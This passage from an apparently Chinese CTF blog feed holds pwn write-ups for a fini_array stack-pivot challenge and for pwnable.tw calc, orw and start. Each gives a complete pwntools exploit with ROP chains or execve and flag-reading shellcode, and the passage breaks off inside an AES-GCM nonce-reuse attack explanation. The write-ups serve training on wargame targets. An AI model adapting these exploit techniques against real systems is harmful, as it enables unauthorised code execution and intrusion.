title="知识点四"></a>知识点四</h3><p>栈迁移</p><p>这里的栈迁移需要观察libc_csu_finit函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960 sub_402960      proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100</span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0 ; fini_array</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: sub_402960+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0] ; 调用fini_array的函数</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996 loc_402996:                             ; CODE XREF: sub_402960+1B↑j</span><br><span class="line">.text:0000000000402996                 add     rsp, 8</span><br><span class="line">.text:000000000040299A                 pop     rbx</span><br><span class="line">.text:000000000040299B                 pop     rbp</span><br><span class="line">.text:000000000040299C                 jmp     sub_48E32C</span><br><span class="line">.text:000000000040299C ; &#125; &#x2F;&#x2F; starts at 402960</span><br><span class="line">.text:000000000040299C sub_402960      endp</span><br></pre></td></tr></table></figure><p>对照glibc源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="keyword">size_t</span> i = __fini_array_end - __fini_array_start;</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    (*__fini_array_start [i]) ();</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _fini ();</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细观察可以发现，程序一开始会执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100</span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0 ; fini_array</span><br></pre></td></tr></table></figure><p>然后会调用fini_array中函数，最后返回libc_csu_finit，并将原rbp弹出（即恢复rbp）</p><p>所以这里我们在fini_array中可以进行栈迁移，例如我们将fini_array[0]对应的函数改为如下汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401C4B                 leave</span><br><span class="line">.text:0000000000401C4C                 retn</span><br></pre></td></tr></table></figure><p>其中leave对应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     rsp,rbp</span><br><span class="line">pop     rbp</span><br></pre></td></tr></table></figure><p>在执行mov rsp,rbp时，由于rbp为0x4B40F0，因此rsp也会变为0x4B40F0。然后执行pop rbp，此时rsp为0x4B40F8，因此rip就会变为内存0x4B4108上的值，并跳转进行执行，此时rsp为0x4B4100。这里0x4B4108即为fini_array[1]，我们将fini_array[1]改写为main后保持不变，而将fini_array[0]，即0x4B40F0改为leave; ret。这样，完成栈迁移后会首先执行main函数，但这无关紧要，因为main函数执行完后会恢复堆栈，即执行完main后rsp仍然在0x4B4100，就可以开始我们的rop了。</p><h3 id="知识点五"><a href="#知识点五" class="headerlink" title="知识点五"></a>知识点五</h3><p>rop构造execve(“/bin/sh”)</p><p>查看x86-64下的系统调用，可知需要设置寄存器为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax&#x3D;0x3b</span><br><span class="line">rdi&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;字符串的地址</span><br><span class="line">rsi&#x3D;0</span><br><span class="line">rdx&#x3D;0</span><br></pre></td></tr></table></figure><p>最终构造出完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_</span><span class="params">(addr, data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">    p.send(str(addr))</span><br><span class="line">    p.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x000000000044a30a : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x000000000047e5d6 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000401696 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000471db5 : syscall ; ret</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># stack layout</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x4b4100 0x44a30a</span></span><br><span class="line"><span class="string">0x4b4108 0</span></span><br><span class="line"><span class="string">0x4b4110 0x47e5d6</span></span><br><span class="line"><span class="string">0x4b4118 0x3b</span></span><br><span class="line"><span class="string">0x4b4120 0</span></span><br><span class="line"><span class="string">0x4b4128 '/bin/sh\x00'</span></span><br><span class="line"><span class="string">0x4b4130 0x401696</span></span><br><span class="line"><span class="string">0x4b4138 0x4b4128 (addr of 'bin/sh\x00')</span></span><br><span class="line"><span class="string">0x4b4138 0x471db5</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">main = <span class="number">0x401B6D</span></span><br><span class="line"></span><br><span class="line">send_(<span class="number">0x4B40F0</span>, p64(libc_csu_fini)+p64(main))</span><br><span class="line">send_(<span class="number">0x4B40F0</span> + <span class="number">0x10</span>, p64(<span class="number">0x44a30a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x47e5d6</span>))</span><br><span class="line">send_(<span class="number">0x4B40F0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>, p64(<span class="number">0x3b</span>) + p64(<span class="number">0</span>) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">send_(<span class="number">0x4B40F0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>, p64(<span class="number">0x401696</span>) + p64(<span class="number">0x4b4128</span>) + p64(<span class="number">0x471db5</span>))</span><br><span class="line">send_(<span class="number">0x4B40F0</span>, p64(leave_ret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw calc</title>
      <link href="/2020/10/12/pwnable_calc/"/>
      <url>/2020/10/12/pwnable_calc/</url>
      
        <content type="html"><![CDATA[<p>找到程序中可疑的写逻辑，即在parse_expr函数中的35行<code>a2[v4 + 1] = v9;</code>这里如果能控制a2使其写到ret address就能进行攻击。想法一比较简单，直接不断递增a2，因为输入的字符串长度为1024，因此可疑造成溢出，使其覆盖到ret address。但是checksec查看后发现程序有canary保护，因此难度较大。想法二，看了网上的writeup，发现可以用“+300+1”这类畸形输入控制a2（这里可以根据输入来模拟一下程序的执行流就会发现确实如此）。</p><p>尝试rop直接调用system函数，发现没有，/bin/sh字符串也没有，因此只能利用小gadget来完成system的系统调用。总体利用思路就是第一次输入先泄露ebp，获取栈地址信息。之后不断改变栈上的数据，构造rop链，需要注意的地方是计算栈上/bin/sh的地址。最后发送一个回车符（退出while循环）即可令程序执行我们的rop链完成攻击。</p><p>完整exp链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./calc')</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x080493FF")</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x08049432")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">" ===\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"+360"</span>)</span><br><span class="line">ebp = int(p.recvuntil(<span class="string">'\n'</span>).strip()) + pow(<span class="number">2</span>,<span class="number">32</span>)</span><br><span class="line">input_base = ebp - <span class="number">1068</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x0805c34b : pop eax ; ret</span></span><br><span class="line"><span class="string">0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="string">0x08049a21 : int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"bin_addr: "</span>+hex(input_base + (<span class="number">368</span><span class="number">-101</span>)*<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">target = [<span class="number">0x0805c34b</span>, <span class="number">11</span>, <span class="number">0x080701d0</span>, <span class="number">0</span>, <span class="number">0</span>, input_base + (<span class="number">368</span><span class="number">-101</span>)*<span class="number">4</span>, <span class="number">0x08049a21</span>, u32(<span class="string">'/bin'</span>), u32(<span class="string">'/sh\x00'</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(target)):</span><br><span class="line">    p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i))</span><br><span class="line">    num = int(p.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line">    <span class="keyword">if</span> target[i]&gt;pow(<span class="number">2</span>,<span class="number">31</span>):</span><br><span class="line">        target[i] -= pow(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> num == target[i]:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> num&gt;target[i]:</span><br><span class="line">        d = num - target[i]</span><br><span class="line">        p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i) + <span class="string">'-'</span> + str(d))</span><br><span class="line">        p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        d = target[i] - num</span><br><span class="line">        p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i) + <span class="string">'+'</span> + str(d))</span><br><span class="line">        p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'\n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
            <tag> vlun </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw orw</title>
      <link href="/2020/10/11/pwnable_orw/"/>
      <url>/2020/10/11/pwnable_orw/</url>
      
        <content type="html"><![CDATA[<p>程序开了沙箱，只能使用open，read，write函数。因此整个流程就是先打开文件，然后读取内容，最后把内容打印出来。</p><p>这里需要了解每一个系统调用的参数设置。</p><h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><p>eax = 0x05 系统调用号</p><p>ebx = filename 文件名</p><p>ecx = flags 置零即可</p><p>edx = mode 置零即可</p><p><strong>返回值</strong>eax = fd</p><h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><p>eax = 0x03  系统调用号</p><p>ebx = fd 文件指针</p><p>ecx = buf 缓冲区，存访读取内容</p><p>edx = len 读取的字节数</p><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><p>eax = 0x04  系统调用号</p><p>ebx = fd  文件指针，标准输出对应1</p><p>ecx = buf</p><p>edx = len</p><p>因此最终写出shellcode如下（需要注意的是文件名如何赋值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx;</span><br><span class="line">push ecx;</span><br><span class="line">push 0x67616c66;</span><br><span class="line">push 0x2f77726f;</span><br><span class="line">push 0x2f656d6f;</span><br><span class="line">push 0x682f2f2f;</span><br><span class="line">mov ebx, esp;</span><br><span class="line">xor edx, edx;</span><br><span class="line">mov eax, 5;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">mov ebx, eax;</span><br><span class="line">mov ecx, esp;</span><br><span class="line">mov edx, 0x30;</span><br><span class="line">mov eax, 3;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">mov ebx, 1;</span><br><span class="line">mov edx, 0x30;</span><br><span class="line">mov eax, 4;</span><br><span class="line">int 0x80;</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx, ecx;</span></span><br><span class="line"><span class="string">push ecx;</span></span><br><span class="line"><span class="string">push 0x67616c66;</span></span><br><span class="line"><span class="string">push 0x2f77726f;</span></span><br><span class="line"><span class="string">push 0x2f656d6f;</span></span><br><span class="line"><span class="string">push 0x682f2f2f;</span></span><br><span class="line"><span class="string">mov ebx, esp;</span></span><br><span class="line"><span class="string">xor edx, edx;</span></span><br><span class="line"><span class="string">mov eax, 5;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, eax;</span></span><br><span class="line"><span class="string">mov ecx, esp;</span></span><br><span class="line"><span class="string">mov edx, 0x30;</span></span><br><span class="line"><span class="string">mov eax, 3;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, 1;</span></span><br><span class="line"><span class="string">mov edx, 0x30;</span></span><br><span class="line"><span class="string">mov eax, 4;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./orw')</span></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw start</title>
      <link href="/2020/10/11/pwnable_start/"/>
      <url>/2020/10/11/pwnable_start/</url>
      
        <content type="html"><![CDATA[<p>IDA无法反编译，只能看汇编，好在逻辑不复杂，简单来说就是一个write和一个read函数调用。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br></pre></td></tr></table></figure><p>翻译为C代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    buf[<span class="number">20</span>]=<span class="string">"Let's start the CTF:"</span>;</span><br><span class="line">    sys_write(<span class="number">1</span>,buf,<span class="number">20</span>);</span><br><span class="line">    sys_read(<span class="number">0</span>,buf,<span class="number">60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显存在栈溢出，而且程序没有开NX保护，直接使用shellcode，接下来就是如何布置shellcode以及获取栈地址信息的过程了。</p><p>这里需要了解一下Linux System Call 的调用规范：调用号放置在 <code>eax</code> 中，参数依次放入 <code>ebx</code>、<code>ecx</code>、<code>edx</code> 等寄存器中，之后 <code>int 80</code> 执行调用，返回值会放入到 <code>eax</code> 中。 因此这里为了获取栈地址，我们只能使用程序自带的write逻辑，因为需要把ecx设置为指向与栈地址相关的指针，这里实际上刚好在程序执行到retn的时候，esp指向的就是esp。因此我们只需要将ret address改为08048087，就能将ecx赋值为esp，然后通过write就能获取esp。之后二次read读取shellcode进行执行。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">SHELLCODE = <span class="string">'''</span></span><br><span class="line"><span class="string">xor    eax,eax</span></span><br><span class="line"><span class="string">push   eax</span></span><br><span class="line"><span class="string">push   0x68732f2f</span></span><br><span class="line"><span class="string">push   0x6e69622f</span></span><br><span class="line"><span class="string">mov    ebx,esp</span></span><br><span class="line"><span class="string">xor    ecx,ecx</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">mov    al,0xb</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./start"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x8048087")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">20</span> + p32(<span class="number">0x8048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">esp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"esp:"</span>, hex(esp)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">shellcode = asm(SHELLCODE)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">20</span> + p32(esp + <span class="number">20</span>) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 第五空间 UnSafeAES Forbidden Attack</title>
      <link href="/2020/07/12/2020-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-UnSafeAES-Forbidden%20Attack/"/>
      <url>/2020/07/12/2020-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-UnSafeAES-Forbidden%20Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    这次第五空间比赛中的密码学比较难，除了一道签到的都没做出来，还是太菜了orz</p><p>​    比赛快结束的时候队内大佬找到了UnSafeAES这道题目的攻击方法，但由于时间原因来不及复现，只好在赛后复现一下，发现这道题还是比较有意思的，因此想分享一下。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>​    这道题的攻击方法叫Forbidden Attack，事实上就是resused nonce attack，下面简单介绍一下。</p><h3 id="推导Authentication-Tag的多项式"><a href="#推导Authentication-Tag的多项式" class="headerlink" title="推导Authentication Tag的多项式"></a>推导Authentication Tag的多项式</h3><p>​    在AES-GCM加密模式中，Authentication Tag是通过有限域GF(2^128)进行一些列乘法所产生的，因此其最终结果可以用多项式来表示。下面将举例说明其多项式的表达式。</p><p><strong>场景一</strong>：假设Alice想利用AES-GCM加密16字节长的明文（plaintext）并使用16字节的相关消息（associated data）来产生相对应的认证标签。因此认证标签的计算结果将为：</p><blockquote><p>$g(X) = ((A_1X + C_1)X + L)X + S$</p></blockquote><p>等价于</p><blockquote><p>$g(X) = A_1X^3 + C_1X^2 + LX + S$</p></blockquote><p>其中$A_1$即为相关消息，$C_1$ 为加密明文所产生的密文，$L$ 等于 len(A) || len(C) ，$S$为$E_k(nonce+1)$，当$X=H$时有$g(H) = T$，这里$H$为认证密钥，$T$为认证标签。</p><p><strong>场景二：</strong>假设Alice想利用AES-GCM加密32字节长的明文（plaintext）并使用32字节的相关消息（associated data）来产生相对应的认证标签。因此认证标签的计算结果将为：</p><blockquote><p>$g(X) = ((((A_1X + A_2)X + C_1)X + C_2)X + L)X + S$</p></blockquote><p>等价于</p><blockquote><p>$g(X) = A_1X^5 + A_2X^4 + C_1X^3 + C_2X^2 + LX + S$</p></blockquote><p><strong>推广：</strong>从场景一以及场景二中，我们可以很容易的推导出产生Authentication Tag的通项式：</p><blockquote><p>$g(X) = A_1X^{m+n+1} + … + A_mX^{n+2} + C_1X^{n+1} + … + C_nX^2 + LX + S$</p></blockquote><h3 id="The-Forbidden-Attack"><a href="#The-Forbidden-Attack" class="headerlink" title="The Forbidden Attack"></a>The Forbidden Attack</h3><p>​    仍举例分析，为了简化考虑，我们假设Alice发送两次消息，两次消息的内容不同，但是均少于16字节，其中加密的结果分别记为$C_{1,1}$,$C_{2,1}$。同时用于计算认证标签的相关消息也均少于16字节，分别记为$A_{1,1}$,$A_{2,1}$。<strong>最重要的是</strong>，两次加密所使用的nonce相同。因此，我们可以得到以下两个式子：</p><blockquote><p>$g1(X) = A_{1,1}X^3 + C_{1,1}X^2 + L_1X + S$</p><p>$g2(X) = A_{2,1}X^3 + C_{2,1}X^2 + L_2X + S$</p></blockquote><p>注意以上的符号均为在有限域GF(2^128)下的多项式表达式，同时不足16字节的部分需要填充，$L_1$和$L_2$根据密文长度和相关消息长度得出。</p><p>​    作为攻击者，我们已知的信息有$C_{1,1}$,$C_{2,1}$,$A_{1,1}$,$A_{2,1}$,$L_1$,$L_2$，而$S$和$X$我们均未知，因此无法直接伪造签名。但是我们可以通过消除S使得未知数的个数减为一个并令多项式等于0，我们就可以通过求解一元三次方程获取到$X$的值。具体做法如下：</p><p>首先我们知道$g1(H) = T_1$，$g2(H) = T_2$。那么我们构造：</p><blockquote><p>$g1^{‘}(X) = A_{1,1}X^3 + C_{1,1}X^2 + L_1X + S + T_1$</p><p>$g2^{‘}(X) = A_{2,1}X^3 + C_{2,1}X^2 + L_2X + S + T_2$</p></blockquote><p>并且有$g1^{‘}(H) = 0$，$g2^{‘}(H) = 0$。然后我们计算$g1’(X) + g2’(X)$，记为$f(X)$，如下：</p><blockquote><p>$f(X) = (A_{1,1}+A_{2,1})X^3 + (C_{1,1}+C_{2,1})X^2 + (L_1+L_2)X + T_1 + T_2$</p></blockquote><p><strong>注意：</strong>有限域中多项式的加法运算等同异或。</p><p>我们成功的将$S$从表达式去消去了！然后我们又有$f(H) = 0$，因此我们可以简单的算出所有可能的$H$，并轻松的伪造签名，达到攻击的目的。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>​    